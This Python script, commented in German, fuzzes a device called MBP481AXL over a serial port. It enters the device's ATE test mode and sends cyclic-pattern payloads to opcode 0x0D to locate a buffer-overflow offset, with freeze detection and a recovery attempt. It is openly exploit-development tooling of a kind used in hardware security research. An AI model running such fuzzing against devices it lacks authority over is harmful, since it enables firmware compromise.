#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ultimate_fuzzer.py - Der finale Exploit-Fuzzer für den MBP481AXL.

Kombiniert alle Erkenntnisse:
- Gezielter Angriff auf den Overflow-Kandidaten (Opcode 0x0D).
- Zyklische Muster-Payloads zur Offset-Findung.
- Robuste Freeze-Erkennung mit Watchdog und Recovery-Versuch.

Let's get this done, Infi.

Nutzung:
  python3 ultimate_fuzzer.py /dev/ttyUSB0
"""

import sys
import time
import serial

# --- Konfiguration ---
if len(sys.argv) < 2:
    sys.exit("Fehlender Port, Hazard. -> Usage: ultimate_fuzzer.py <serial_dev>")

DEV = sys.argv[1]
BAUD = 115200
TIMEOUT = 0.5
MAX_LEN = 512  # Wir können jetzt mutiger sein
LOGFILE = "ultimate_fuzzer.log"
FREEZE_THRESHOLD = 3  # Anzahl der Timeouts, bevor wir von einem Freeze ausgehen

# --- ATE-Protokoll-Definitionen ---
PREAMBLE = b"\x55\xAA"
OP_TRIGGER = 0x72
OP_TARGET = 0x0D

def generate_pattern(length: int) -> bytes:
    """Erzeugt ein einzigartiges, zyklisches Muster."""
    pattern = b""
    chars = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    i = 0
    while len(pattern) < length:
        pattern += bytes([chars[i % len(chars)], chars[(i+1) % len(chars)], chars[(i+2) % len(chars)]])
        i += 3
    return pattern[:length]

def wait_for_prompt(ser, prompt_bytes, timeout=10.0):
    """Wartet geduldig, bis ein bestimmter String im seriellen Port auftaucht."""
    print(f"[*] Warte auf Prompt '{prompt_bytes.decode(errors='ignore')}' (Timeout: {timeout}s)...")
    buffer = b''
    start_time = time.time()
    while time.time() - start_time < timeout:
        if ser.in_waiting:
            buffer += ser.read(ser.in_waiting)
            if prompt_bytes in buffer:
                print("[+] Prompt erkannt!")
                return True
        time.sleep(0.1)
    print(f"[!] Timeout! Prompt nicht gefunden. Letzte Daten: {buffer[-200:]!r}")
    return False

def main():
    print(f"[*] Starte Ultimate Fuzzer für Opcode 0x{OP_TARGET:02X} auf {DEV}")
    try:
        ser = serial.Serial(DEV, BAUD, timeout=TIMEOUT)
    except serial.SerialException as e:
        sys.exit(f"[!] Fehler: Serielle Schnittstelle konnte nicht geöffnet werden: {e}")

    with open(LOGFILE, "wb", buffering=0) as log:
        if not wait_for_prompt(ser, b"Please key 'y' or 'Y'"):
            sys.exit(1)

        print("[*] Wechsle in den ATE-Modus...")
        ser.write(b'y')
        time.sleep(0.5)
        ser.reset_input_buffer()
        log.write(b"[*] Entered ATE mode.\n")

        freeze_counter = 0
        for length in range(1, MAX_LEN + 1):
            payload = generate_pattern(length)
            print(f"[*] Teste Länge: {length} bytes, Payload: {payload.decode(errors='ignore')}")

            # 1. Trigger senden
            trigger_frame = PREAMBLE + bytes([OP_TRIGGER, 0, 0])
            ser.write(trigger_frame)
            time.sleep(0.1)
            ser.read(1024)

            # 2. Target mit Muster-Payload senden
            target_frame = PREAMBLE + bytes([OP_TARGET, length & 0xFF, (length >> 8) & 0xFF]) + payload
            log.write(f"\n> LEN={length} | FRAME: {target_frame.hex(' ')}\n".encode())
            ser.write(target_frame)
            time.sleep(0.2)
            response = ser.read(1024)

            # 3. Watchdog-Logik
            if response:
                freeze_counter = 0
                log.write(f"< RESPONSE: {response.hex(' ')}\n".encode())
                resp_text = response.decode('utf-8', errors='ignore')
                log.write(f"< TEXT: {repr(resp_text)}\n".encode())
                if "Error" in resp_text:
                    print(f"  [+] Crash/Error bei Länge {length}! Antwort: {repr(resp_text)}")
            else:
                freeze_counter += 1
                print(f"  [!] KEINE ANTWORT bei Länge {length}. Freeze-Zähler: {freeze_counter}/{FREEZE_THRESHOLD}")
                log.write(f"< NO RESPONSE (Freeze Count: {freeze_counter})\n".encode())
                
                if freeze_counter >= FREEZE_THRESHOLD:
                    print("[!] GERÄT EINGEFROREN! Versuche Recovery mit ESC + NUL und beende den Lauf.")
                    log.write(b"!!! DEVICE FROZEN - ATTEMPTING RECOVERY AND EXITING !!!\n")
                    ser.write(b"\x1b\x00")  # ESC + NUL, wie in deinem Beispiel
                    time.sleep(0.5)
                    break  # Fuzzing-Lauf abbrechen

    print(f"\n[+] Fuzzing beendet. Ergebnisse findest du in '{LOGFILE}'.")
    ser.close()

if __name__ == "__main__":
    main()
